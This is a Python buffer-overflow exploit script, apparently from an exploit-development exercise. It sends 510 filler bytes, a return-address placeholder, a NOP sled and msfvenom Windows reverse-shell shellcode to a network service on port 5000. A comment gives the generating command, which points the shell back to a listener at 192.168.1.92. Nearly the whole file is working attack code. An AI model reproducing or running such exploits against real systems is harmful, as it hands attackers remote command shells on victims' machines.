#!/usr/bin/python3
import sys
import socket
from time import sleep

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "badchars" -f c

shellcode = (
"\xb8\xa9\x8f\x74\x39\xd9\xcf\xd9\x74\x24\xf4\x5f\x31\xc9"
"\xb1\x52\x31\x47\x12\x83\xc7\x04\x03\xee\x81\x96\xcc\x0c"
"\x75\xd4\x2f\xec\x86\xb9\xa6\x09\xb7\xf9\xdd\x5a\xe8\xc9"
"\x96\x0e\x05\xa1\xfb\xba\x9e\xc7\xd3\xcd\x17\x6d\x02\xe0"
"\xa8\xde\x76\x63\x2b\x1d\xab\x43\x12\xee\xbe\x82\x53\x13"
"\x32\xd6\x0c\x5f\xe1\xc6\x39\x15\x3a\x6d\x71\xbb\x3a\x92"
"\xc2\xba\x6b\x05\x58\xe5\xab\xa4\x8d\x9d\xe5\xbe\xd2\x98"
"\xbc\x35\x20\x56\x3f\x9f\x78\x97\xec\xde\xb4\x6a\xec\x27"
"\x72\x95\x9b\x51\x80\x28\x9c\xa6\xfa\xf6\x29\x3c\x5c\x7c"
"\x89\x98\x5c\x51\x4c\x6b\x52\x1e\x1a\x33\x77\xa1\xcf\x48"
"\x83\x2a\xee\x9e\x05\x68\xd5\x3a\x4d\x2a\x74\x1b\x2b\x9d"
"\x89\x7b\x94\x42\x2c\xf0\x39\x96\x5d\x5b\x56\x5b\x6c\x63"
"\xa6\xf3\xe7\x10\x94\x5c\x5c\xbe\x94\x15\x7a\x39\xda\x0f"
"\x3a\xd5\x25\xb0\x3b\xfc\xe1\xe4\x6b\x96\xc0\x84\xe7\x66"
"\xec\x50\xa7\x36\x42\x0b\x08\xe6\x22\xfb\xe0\xec\xac\x24"
"\x10\x0f\x67\x4d\xbb\xea\xe0\xb2\x94\xff\xf1\x5a\xe7\xff"
"\xe0\xc6\x6e\x19\x68\xe7\x26\xb2\x05\x9e\x62\x48\xb7\x5f"
"\xb9\x35\xf7\xd4\x4e\xca\xb6\x1c\x3a\xd8\x2f\xed\x71\x82"
"\xe6\xf2\xaf\xaa\x65\x60\x34\x2a\xe3\x99\xe3\x7d\xa4\x6c"
"\xfa\xeb\x58\xd6\x54\x09\xa1\x8e\x9f\x89\x7e\x73\x21\x10"
"\xf2\xcf\x05\x02\xca\xd0\x01\x76\x82\x86\xdf\x20\x64\x71"
"\xae\x9a\x3e\x2e\x78\x4a\xc6\x1c\xbb\x0c\xc7\x48\x4d\xf0"
"\x76\x25\x08\x0f\xb6\xa1\x9c\x68\xaa\x51\x62\xa3\x6e\x71"
"\x81\x61\x9b\x1a\x1c\xe0\x26\x47\x9f\xdf\x65\x7e\x1c\xd5"
"\x15\x85\x3c\x9c\x10\xc1\xfa\x4d\x69\x5a\x6f\x71\xde\x5b"
"\xba")

buffer = "A" * 510 + "B" * 4 + "\x90" * 32 + shellcode

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.2', 5000))
        payload = b'shitstorm /.:/' + buffer
        sock.send(payload)
        sock.close()
    except:
        print("Error connecting to the server")
        sys.exit()
